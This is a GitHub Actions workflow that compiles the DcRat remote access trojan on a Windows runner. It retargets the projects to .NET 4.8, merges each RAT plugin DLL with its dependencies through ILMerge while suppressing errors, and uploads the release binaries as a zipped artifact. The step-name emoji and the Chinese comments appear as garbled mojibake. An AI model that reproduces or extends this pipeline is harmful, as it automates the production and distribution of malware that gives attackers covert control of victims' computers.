name: Build DcRat

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Setup MSBuild
      uses: microsoft/setup-msbuild@v2

    - name: Setup NuGet
      uses: NuGet/setup-nuget@v2

    - name: Restore NuGet packages
      run: nuget restore DcRat.sln

    - name: üîß Retarget all projects to .NET Framework 4.8
      shell: pwsh
      run: |
        Write-Host "Retargeting all .csproj files to .NET Framework 4.8..."
        Get-ChildItem -Recurse -Filter *.csproj | ForEach-Object {
          (Get-Content $_.FullName) -replace '<TargetFrameworkVersion>v4\.[0-9]+</TargetFrameworkVersion>', '<TargetFrameworkVersion>v4.8</TargetFrameworkVersion>' | Set-Content $_.FullName
        }
        Write-Host "Retargeting complete."

    - name: üß± Build solution
      run: msbuild -nologo -v:m -p:Configuration=Release DcRat.sln

    - name: ‚ö° Merge plugin DLLs safely with ILMerge
      shell: pwsh
      run: |
        $ilmerge = "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\ILMerge.exe"
        $outputDir = "D:\a\DcRat\DcRat\Binaries\Release\Plugins"
        if (!(Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir }

        $plugins = Get-ChildItem -Path "DcRat\DcRat\Plugin" -Directory
        foreach ($plugin in $plugins) {
            $dllPath = Join-Path $plugin.FullName "obj\Release\$($plugin.Name).dll"
            if (!(Test-Path $dllPath)) { Write-Warning "$($plugin.Name) DLL not found, skipping"; continue }

            # Êî∂ÈõÜ‰æùËµñ DLLÔºàMessagePackLib + Êèí‰ª∂ÁõÆÂΩï‰∏ãÁöÑÂÖ∂‰ªñ DLLÔºâ
            $dependencyDlls = @("D:\a\DcRat\DcRat\MessagePack\bin\Release\MessagePackLib.dll")
            $pluginReleaseDlls = Get-ChildItem -Path $plugin.FullName -Recurse -Filter *.dll | Where-Object { $_.FullName -ne $dllPath }
            foreach ($dep in $pluginReleaseDlls) { $dependencyDlls += $dep.FullName }

            $outputDll = Join-Path $outputDir "$($plugin.Name).dll"
            Write-Host "Merging $($plugin.Name) with dependencies..."

            # ÊçïËé∑ ILMerge exit codeÔºåÈÅøÂÖç Workflow Â§±Ë¥•
            try {
                & $ilmerge `
                  /targetplatform:v4,"C:\Windows\Microsoft.NET\Framework\v4.0.30319" `
                  /allowDup `
                  /closed `
                  /out:$outputDll `
                  $dllPath `
                  $dependencyDlls
            } catch {
                Write-Warning "ILMerge returned non-zero exit code for $($plugin.Name), ignored."
            }
        }

    - name: üì¶ Upload build artifacts
      uses: actions/upload-artifact@v4
      with:
        name: DcRat-Build
        path: D:\a\DcRat\DcRat\Binaries\Release\

    - name: zip self
      if: always()
      shell: pwsh
      run: |
        $zipPath = "D:\a\DcRat\DcRat\Binaries\Release\DcRat-Build.zip"
        if (Test-Path $zipPath) { Remove-Item $zipPath }
        Compress-Archive -Path "D:\a\DcRat\DcRat\Binaries\Release\*" -DestinationPath $zipPath
        Write-Host "ZIP package created at $zipPath"
      continue-on-error: true
